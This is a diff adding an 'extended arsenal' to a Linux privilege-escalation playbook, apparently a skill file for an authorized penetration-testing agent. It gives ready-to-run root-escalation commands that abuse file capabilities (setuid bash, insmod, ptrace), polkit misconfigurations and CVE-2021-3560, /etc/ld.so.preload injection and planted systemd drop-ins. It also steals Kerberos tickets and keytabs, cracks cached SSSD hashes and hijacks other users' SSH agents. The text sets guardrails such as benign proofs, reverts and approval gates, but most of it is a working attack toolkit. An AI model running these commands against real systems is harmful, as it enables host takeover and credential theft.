@@ -170,3 +170,84 @@ Notes-sourced PoCs seen in the user's set: **CopyFail** (DirtyPipe-class, overwr
   SUID copies, `/etc/passwd`|`shadow` edits (with the restored original), cron/service edits, containers,
   proof files — and confirms each was reverted.
 - NO persistence, NO backdoors, NO destruction, NO data exfil beyond the single proof line. In-scope host only.
+
+---
+
+## Extended arsenal — capabilities depth, polkit, ld.so, systemd/D-Bus, ticket & agent reuse, container hand-off
+# Append-only extension. Same ethos: in-scope host, BENIGN proof (id → uid=0), lowest-risk first; back up anything
+# you touch, REDACT recovered secrets to fingerprints, record every change in cleanup.md and revert. CVE/driver = last resort.
+
+### A. File capabilities — quick table + the vectors beyond §2
+```
+getcap -r / 2>/dev/null           # enumerate file caps; also eye CapEff of root daemons you can influence (/proc/<pid>/status)
+```
+§2 already covers cap_setuid / cap_dac_override / cap_dac_read_search. Remaining dangerous caps:
+| capability (+ep) on a binary | primitive → benign root proof |
+|---|---|
+| cap_setuid           | interpreter → setuid(0) (see §2)                            |
+| cap_dac_read_search  | READ any file incl. /etc/shadow (see §2)                    |
+| cap_dac_override     | WRITE any file incl. /etc/passwd (see §2)                   |
+| cap_chown            | chown a root-owned config you then abuse (indirect)         |
+| cap_fowner           | chmod a root-owned binary → set the setuid bit on it        |
+| cap_sys_ptrace       | attach to a root process (feasibility proof, no payload)    |
+| cap_sys_admin        | mount/overlayfs → container-escape-class; often 1 step to root|
+| cap_sys_module       | insert a kernel module → ring-0 (HIGH-RISK, approval-gated) |
+| cap_sys_rawio        | /dev/mem,/dev/port → read/patch kernel memory (HIGH-RISK)   |
+| cap_net_raw/net_admin| sniff/forge on the wire (lateral, not direct root)          |
+```
+# cap_fowner — chmod a root-owned bin you normally can't: chmod u+s /bin/bash → bash -p (BACK UP perms; revert chmod u-s).
+# cap_sys_ptrace — prove reach into a root process, no injection: gdb -p <root_pid> -batch -ex 'call (int)getuid()'; detach.
+# cap_sys_module — build a trivial marker .ko, insmod, confirm dmesg marker, rmmod. Ring-0 — approval-gated, last resort, never a rootkit.
+# cap_sys_admin — treat as an escape primitive (§F); do not fire a mount/overlay root trick on prod without approval.
+```
+
+### B. polkit / pkexec misconfig — beyond PwnKit (CVE-2021-4034, in §9)
+```
+pkexec --version; pkaction | head                      # polkit present? which actions are registered
+grep -R . /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/ 2>/dev/null   # permissive rule: ResultActive/ResultAny == "yes"
+cat /etc/polkit-1/localauthority/*/*.pkla 2>/dev/null                        # legacy .pkla allow-any entries
+```
+# CVE-2021-3560 — polkit D-Bus auth-bypass RACE (distinct from PwnKit): time a dbus/accountsservice call so polkit
+#   mis-attributes it to uid 0 → create an admin user WITHOUT auth. HIGH-RISK, approval-gated, last resort.
+# Misconfig (no CVE): if a privileged action (package-install, systemd-manage, mount, hostname) is allowed to you,
+#   invoke it via pkexec / gdbus to run a benign root action (e.g. a package pre/post-install hook = root exec).
+
+### C. ld.so global injection (file-based, distinct from the sudo env_keep LD_PRELOAD in §1)
+```
+ls -la /etc/ld.so.preload /etc/ld.so.conf.d/ 2>/dev/null
+# writable /etc/ld.so.preload → your .so loads into EVERY setuid-root binary → root on the next sudo/su/ping (BACK UP first,
+#   the .so does setuid(0);system("id>/tmp/pe.txt"); then REVERT the file + remove the .so).
+# writable /etc/ld.so.conf.d/*.conf → add a dir you control, wait for a root `ldconfig` → library hijack.
+# sudo SETENV tag: a sudoers line `user host = SETENV: /path/cmd` lets you pass LD_PRELOAD even WITHOUT env_keep.
+```
+
+### D. Writable systemd unit / D-Bus service — beyond the one-line §3 note
+```
+systemctl cat <unit> 2>/dev/null; find /etc/systemd/system /run/systemd/system -writable 2>/dev/null
+# writable unit OR writable drop-in dir → add an override (no need to edit a sealed unit file):
+mkdir -p /etc/systemd/system/<svc>.service.d
+printf '[Service]\nExecStartPre=/bin/sh -c "id>/tmp/pe.txt"\n' > /etc/systemd/system/<svc>.service.d/override.conf
+systemctl daemon-reload && systemctl restart <svc>     # if permitted → benign root marker; then REMOVE the drop-in + reload
+# also: writable EnvironmentFile= a root unit reads; writable .path/.timer/.socket unit (activation trigger).
+# sudo-allowed systemd-run → sudo systemd-run -t /bin/sh  (root pty). ~/.config/systemd/user runs as YOU, not root.
+# D-Bus system service: writable /usr/share/dbus-1/system-services/*.service, or a .conf granting send_destination to a
+#   root bus name → trigger activation of a root-run service. Enumerate: busctl list; ls /etc/dbus-1/system.d/.
+```
+
+### E. Kerberos ccache / keytab, SSSD cache, SSH-agent & GPG-agent reuse
+```
+ls -la /tmp/krb5cc_* /run/user/*/krb5cc* 2>/dev/null; klist 2>/dev/null       # borrow a readable TGT → ssh -K / kadmin as it
+cat /etc/krb5.keytab >/dev/null 2>&1 && klist -k /etc/krb5.keytab             # readable keytab → extract keys (REDACT)
+ls -la /var/lib/sss/db/*.ldb /var/lib/sss/secrets/* 2>/dev/null               # SSSD offline cache: cached AD hashes → crack (REDACT)
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN ssh-add -l                              # hijack another user's agent socket → pivot ssh (no key file)
+# also grep /proc/<pid>/environ for SSH_AUTH_SOCK/KRB5CCNAME. ~/.gnupg keyrings/gpg-agent similarly reusable. REDACT every secret.
+```
+
+### F. Container-aware escalation — detect, then hand off
+```
+ls -la /.dockerenv /run/.containerenv 2>/dev/null; systemd-detect-virt -c 2>/dev/null
+grep -qaE 'docker|lxc|kubepods|containerd' /proc/1/cgroup /proc/self/cgroup 2>/dev/null && echo containerized
+grep -i cap /proc/self/status                                                  # CapEff hints (cap_sys_admin → escape-prone)
+# → if containerized, root-in-container != host root: STOP and run the container-escape skill (privileged / mounted docker.sock /
+#   hostPath / release_agent / cap_sys_admin breakout). This playbook assumes a bare-metal or VM host.
+```
